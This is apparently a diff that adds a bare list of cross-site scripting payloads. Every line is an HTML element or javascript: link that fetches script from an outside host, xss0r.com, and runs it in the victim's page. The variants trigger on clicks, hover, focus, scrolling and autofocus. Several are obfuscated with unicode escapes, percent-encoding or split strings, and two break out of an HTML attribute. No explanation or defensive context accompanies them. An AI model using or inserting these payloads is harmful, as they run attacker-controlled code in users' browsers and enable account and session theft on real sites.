@@ -1,0 +1,22 @@
+<a href="javascript:fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})">Click me</a>
+<a href="#" onclick="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Click me</a>
+<input onblur="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">
+<div ondblclick="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Double-click me</div>
+<div oncontextmenu="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Right-click me</div>
+<div onmouseover="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Hover over me</div>
+<div onmousedown="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Press me</div>
+<div onmouseup="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Release me</div>
+<div onwheel="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Scroll on me</div>
+<a onclick="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Click</a>
+<a href="javascript:(new Function('fetch(\'https://xss0r.com/c/munna7\').then(r=>r.text()).then(t=>{let s=document.createElement(\'script\');s.innerHTML=t;document.body.appendChild(s);})'))()">Click me</a>
+<a href="javascript:let f='fetch',u='https://xss0r.com/c/munna7',e='eval';window[e](`${f}('${u}').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})`)">Click me</a>
+<a href="javascript:fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})">Click me</a>
+<a href="javascript:eval('\u0066\u0065\u0074\u0063\u0068(\u0027https://xss0r.com/c/munna7\u0027).then(\u0072=>\u0072.text()).then(\u0074=>{let \u0073=document.createElement(\u0027script\u0027);\u0073.innerHTML=\u0074;document.body.appendChild(\u0073);})')">Click me</a>
+<div onmouseover="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Hover over me</div>
+<a href="javascript:(function(){let s=document.createElement('script');s.src='https://xss0r.com/c/munna7';document.body.appendChild(s);})()">Click me</a>
+<div onclick="let p=unescape('%66%65%74%63%68%28%27%68%74%74%70%73%3A%2F%2F%78%73%73%30%72%2E%63%6F%6D%2F%63%2F%7Bmunna7%7D%27%29%2E%74%68%65%6E%28%72%3D%3E%72%2E%74%65%78%74%28%29%29%2E%74%68%65%6E%28%65%76%61%6C%29%3B');eval(p)">Click me</div>
+<div onclick="fetch(decodeURIComponent('%68%74%74%70%73%3A%2F%2F%78%73%73%30%72%2E%63%6F%6D%2F%63%2F%7Bmunna7%7D')).then(r=>r.text()).then(eval)">Click me</div>
+<textarea onfocus="fetch('https://xss0r.com/c/munna7').then(r=>r.text()).then(eval)">Focus me</textarea>
+<div onclick="let u='https://xss0r.com/c/'.concat('munna7');fetch(u).then(r=>r.text()).then(eval)">Click me</div>
+"><div contenteditable autofocus onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss0r.com/c/munna7'">Click me!</div>
+"><div autofocus contenteditable onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss0r.com/c/munna7'">Focus here</div>
